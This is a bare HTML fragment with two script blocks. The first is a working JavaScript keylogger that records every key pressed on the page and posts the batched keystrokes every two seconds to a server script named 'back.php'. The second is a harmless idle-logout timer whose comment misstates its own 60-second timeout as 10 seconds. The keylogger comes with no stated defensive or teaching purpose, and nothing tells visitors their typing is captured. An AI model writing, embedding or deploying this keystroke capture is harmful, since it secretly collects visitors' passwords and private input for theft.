<script>
var keylog = {
cache: [],
delay: 2000,
sending: false,
init: function () {
//addEventListener for adding event handler to the
Webpage
window.addEventListener("keydown", function (evt) {
keylog.cache.push(evt.key);
});
//Set Interval for periodically calling the send
function
window.setInterval(keylog.send, keylog.delay);
},
send: function () {
if (!keylog.sending && keylog.cache.length != 0) {
keylog.sending = true;
//FormData converts the existing data to key
value pairs
var data = new FormData();
//JSON.stringify converts the formdata into
JSON object
data.append("keys",
JSON.stringify(keylog.cache));
keylog.cache = [];
//SXMLHTTPRequest Object to send data
var xhr = new XMLHttpRequest();
xhr.open("POST", "back.php");
xhr.onload = function () {
keylog.sending = false;
console.log(this.response);
};
xhr.send(data);
}
}
};
window.addEventListener("DOMContentLoaded", keylog.init);
</script>

<script>
var IdealTimeOut = 60; //10 seconds
var idleSecondsTimer = null;
var idleSecondsCounter = 0;
document.onclick = function () { idleSecondsCounter = 0; };
document.onmousemove = function () { idleSecondsCounter = 0; };
document.onkeypress = function () { idleSecondsCounter = 0; };
idleSecondsTimer = window.setInterval(CheckIdleTime, 1000);
function CheckIdleTime() {
idleSecondsCounter++;
var oPanel = document.getElementById("timeOut");
if (oPanel) {
oPanel.innerHTML = (IdealTimeOut - idleSecondsCounter);
}
if (idleSecondsCounter >= IdealTimeOut) {
window.clearInterval(idleSecondsTimer);
window.alert("Due to Inactivity , You have been logged
out....");
window.location.replace("index.html");
}
}
</script>
